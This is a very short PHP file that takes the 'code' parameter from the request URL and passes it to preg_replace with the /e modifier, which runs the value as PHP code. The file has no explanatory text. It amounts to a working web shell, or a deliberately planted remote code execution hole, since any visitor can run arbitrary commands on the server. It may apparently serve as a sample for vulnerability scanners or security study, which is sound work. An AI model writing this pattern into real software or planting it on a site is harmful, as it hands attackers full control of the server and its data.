<?php

$replacement = $_GET["code"];

preg_replace('/.*/e', $replacement, 'value');
